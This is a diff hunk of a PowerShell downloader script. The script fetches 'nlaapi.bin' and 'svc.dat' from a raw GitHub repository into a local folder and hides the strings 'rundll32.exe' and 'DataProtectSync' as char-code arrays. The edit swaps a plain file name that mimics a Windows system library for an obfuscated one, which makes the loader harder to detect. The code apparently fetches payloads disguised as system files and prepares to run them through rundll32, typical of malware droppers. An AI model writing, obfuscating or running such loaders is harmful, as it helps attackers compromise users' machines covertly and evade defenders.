@@ -5,7 +5,7 @@ if(!(Test-Path $p)){[void](mkdir $p -Force)}
 $wc=New-Object Net.WebClient
 $u='https://raw.githubusercontent.com/haha150/temp/main'
 $wc.DownloadFile("$u/nlaapi.bin","$p\nlaapi.bin")
-$d="$p\wbemcomn.dat"
+$d="$p\$(-join[char[]](99,110,103,46,100,97,116))"
 $wc.DownloadFile("$u/svc.dat",$d)
 $e=-join[char[]](114,117,110,100,108,108,51,50,46,101,120,101)
 $m=-join[char[]](68,97,116,97,80,114,111,116,101,99,116,83,121,110,99)
